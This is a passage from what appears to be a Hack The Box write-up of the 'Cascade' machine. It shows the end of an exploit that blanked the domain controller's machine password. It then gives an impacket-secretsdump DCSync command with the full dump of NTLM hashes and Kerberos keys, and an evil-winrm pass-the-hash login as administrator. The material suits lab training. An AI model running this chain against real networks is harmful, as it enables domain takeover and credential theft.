+Exploit complete!</code></pre><p>This set the DC machine account password to a blank string</p><p>Now i can do a DCSync</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">impacket-secretsdump -just-dc -no-pass casc-dc1\$@10.129.18.9 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+cascade.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:7c2ea40b06d267f1557a09ac086b4487:::
+cascade.local\CascGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3a1b37192392d74e86d04242288dc147:::
+cascade.local\arksvc:1106:aad3b435b51404eeaad3b435b51404ee:10ffc991edaa4635cf81eb91762420cb:::
+cascade.local\s.smith:1107:aad3b435b51404eeaad3b435b51404ee:b48b49789458698abadc119c8e310703:::
+cascade.local\r.thompson:1109:aad3b435b51404eeaad3b435b51404ee:63251f7b1bada5082e5ffb18261ba28f:::
+cascade.local\util:1111:aad3b435b51404eeaad3b435b51404ee:49a914ea7201025aeff21cd858ec7d66:::
+cascade.local\j.wakefield:1116:aad3b435b51404eeaad3b435b51404ee:13ae5d7704258917054d662d016eab60:::
+cascade.local\s.hickson:1121:aad3b435b51404eeaad3b435b51404ee:2776416ceb426c515cab11bb8411067b:::
+cascade.local\j.goodhand:1122:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::
+cascade.local\a.turnbull:1124:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::
+cascade.local\e.crowe:1127:aad3b435b51404eeaad3b435b51404ee:95d4f729c16ae37b910317d665ba2215:::
+cascade.local\b.hanson:1128:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::
+cascade.local\d.burman:1129:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::
+cascade.local\BackupSvc:1130:aad3b435b51404eeaad3b435b51404ee:c27e154566c4788326fce339f4b55491:::
+cascade.local\j.allen:1134:aad3b435b51404eeaad3b435b51404ee:64928a685f9a995045f8c04bbf86881d:::
+cascade.local\i.croft:1135:aad3b435b51404eeaad3b435b51404ee:431682a8242a237e805badacab95b0e4:::
+CASC-DC1$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WIN-RRNTVQP3YBF$:1139:aad3b435b51404eeaad3b435b51404ee:8d0289b6229a0659a6c90c96ee3846dc:::
+[*] Kerberos keys grabbed
+cascade.local\administrator:aes256-cts-hmac-sha1-96:201b2d849679d315b51959d1acd879032e1f6dba6fa9feb772a2d985edc2c2cf
+cascade.local\administrator:aes128-cts-hmac-sha1-96:5ebdd49d14c5b62141ab0e6a2780ef70
+cascade.local\administrator:des-cbc-md5:1532f8259b2c4f45
+krbtgt:aes256-cts-hmac-sha1-96:25deaf37ed42e5cd95b76850d9d76fa663fcce3a9512f31357f5e45d333ca5ea
+krbtgt:aes128-cts-hmac-sha1-96:22f5ccb8e68382406cb6e3c24c706208
+krbtgt:des-cbc-md5:fba77f5b31239d9e
+cascade.local\arksvc:aes256-cts-hmac-sha1-96:3717cd1cd9e13ac692bd99e0de0bbdd7910296f8d1f465cb559f76eb63f21bcc
+cascade.local\arksvc:aes128-cts-hmac-sha1-96:0e34dc2f704261583d5f0bfbdf4cac14
+cascade.local\arksvc:des-cbc-md5:73f2c423982534a8
+cascade.local\s.smith:aes256-cts-hmac-sha1-96:c5b64b93302ccfb91648acea44a708797371bcec306a74a42d614365329635ce
+cascade.local\s.smith:aes128-cts-hmac-sha1-96:4cc2dc914d7d971f3708dba510b1a1e9
+cascade.local\s.smith:des-cbc-md5:6be0fdeab6cec762
+cascade.local\r.thompson:aes256-cts-hmac-sha1-96:d5bf934e36dbbb73b35345f08117b844874b343c9149095ff86034172272259e
+cascade.local\r.thompson:aes128-cts-hmac-sha1-96:def0284f32bcaa0291184f0e6b2a8af0
+cascade.local\r.thompson:des-cbc-md5:89e3da3dc74576d9
+cascade.local\util:aes256-cts-hmac-sha1-96:9e74ea4fa951ebe411bb9d734c48202fd346a21e414bc61c49ff14b41ba14bb5
+cascade.local\util:aes128-cts-hmac-sha1-96:cadfed05f20d4ca27ffa30b30664dbae
+cascade.local\util:des-cbc-md5:c4a8765b4f3db901
+cascade.local\j.wakefield:aes256-cts-hmac-sha1-96:c3a6a1518a513ef2344859b204692d92adea4c78a6b8539e1743cfcbeb85dc5c
+cascade.local\j.wakefield:aes128-cts-hmac-sha1-96:134734b88534d38ce5bd786bac268f07
+cascade.local\j.wakefield:des-cbc-md5:a876678997570e6d
+cascade.local\s.hickson:aes256-cts-hmac-sha1-96:ebdd5dd6e9d0dfac16983b005db8e84b482250740bc3e64b0e58ae30f7e7a7b5
+cascade.local\s.hickson:aes128-cts-hmac-sha1-96:83b64186d9c5d8e74b44d6efa3b19ed7
+cascade.local\s.hickson:des-cbc-md5:ce8c2f9dfe3b3ddf
+cascade.local\j.goodhand:aes256-cts-hmac-sha1-96:770b3bd99ce9b17bbf3e35a839615eb1204cbae05990db83e9393a2564c2f8ed
+cascade.local\j.goodhand:aes128-cts-hmac-sha1-96:11ccc9eea5401915a46406441e50ed8f
+cascade.local\j.goodhand:des-cbc-md5:fb9226a16d94ba64
+cascade.local\a.turnbull:aes256-cts-hmac-sha1-96:4adfe6a4be270895c5a55e440e2a14d70db45f4729d82caff0c157140729f3f1
+cascade.local\a.turnbull:aes128-cts-hmac-sha1-96:89c3c86c69648eea1e589db7316710ae
+cascade.local\a.turnbull:des-cbc-md5:2c076e23493ef7ba
+cascade.local\e.crowe:aes256-cts-hmac-sha1-96:c6459e3f1647f02bd9528bca926beb8bfc944b42f3b12d9777fbdc59431fdc43
+cascade.local\e.crowe:aes128-cts-hmac-sha1-96:6d36444d8f1b1a4bda6d7c4118ed61d9
+cascade.local\e.crowe:des-cbc-md5:f445588fae23a729
+cascade.local\b.hanson:aes256-cts-hmac-sha1-96:a6071c3a20a3ce2e373e8586ef7bd12cb665eb6ee66d110df57ee9f703b528f0
+cascade.local\b.hanson:aes128-cts-hmac-sha1-96:34f9f21922871be23e9bedc3fc1741cd
+cascade.local\b.hanson:des-cbc-md5:57ef54d568d03e86
+cascade.local\d.burman:aes256-cts-hmac-sha1-96:b6a2a64a272ba6c7d2cf638b8614a370d597bc167222555ec655facca6ebfe08
+cascade.local\d.burman:aes128-cts-hmac-sha1-96:310087249254f69e0436b2113f08909e
+cascade.local\d.burman:des-cbc-md5:83313268372502c2
+cascade.local\BackupSvc:aes256-cts-hmac-sha1-96:ffba7ff6b18eba90d46d787e56a0a0ebba7c8d933f992f2b896e5c7ec7da8720
+cascade.local\BackupSvc:aes128-cts-hmac-sha1-96:854bd600cad9e7cd309eb124039b25a7
+cascade.local\BackupSvc:des-cbc-md5:9ea4d0da8cdcbcef
+cascade.local\j.allen:aes256-cts-hmac-sha1-96:56a9256363211ec2ac9ac5d64ddc931b10123bdf4ce4a90c4eee14aab91e401a
+cascade.local\j.allen:aes128-cts-hmac-sha1-96:7f03f34bc8c2919a6b6ddd22c983d23c
+cascade.local\j.allen:des-cbc-md5:a1b0c14f0ec715a8
+cascade.local\i.croft:aes256-cts-hmac-sha1-96:a26cfa25eeb98248137d57f00a509aca41a091218b5a9971ca6af7cd0552c469
+cascade.local\i.croft:aes128-cts-hmac-sha1-96:ac531c4553b8f5c2f62614d91e9864e5
+cascade.local\i.croft:des-cbc-md5:b6f89862bf854cf1
+CASC-DC1$:aes256-cts-hmac-sha1-96:512b1c0937d82f8226296d4ce7fd819dcb5f355edc5f107bacb873507fdbe518
+CASC-DC1$:aes128-cts-hmac-sha1-96:93716a94d39656950840d265c55dd8b5
+CASC-DC1$:des-cbc-md5:fd6b9b4ceaf2ef7c
+WIN-RRNTVQP3YBF$:aes256-cts-hmac-sha1-96:a6da10f4e1d7aaa44720f3dc90e57244a5499672c3fd012caa91d66ef28718ca
+WIN-RRNTVQP3YBF$:aes128-cts-hmac-sha1-96:74e529f46e3b81ca02b6aa5d4adb60c0
+WIN-RRNTVQP3YBF$:des-cbc-md5:2640269491ce6e92
+[*] Cleaning up...</code></pre><p>I now have all the hashes</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i casc-dc1.cascade.local -u administrator -H &#39;7c2ea40b06d267f1557a09ac086b4487&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre><p>Domain admin! AGAIN!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-intelligence/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Intelligence</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-mantis/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Mantis</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
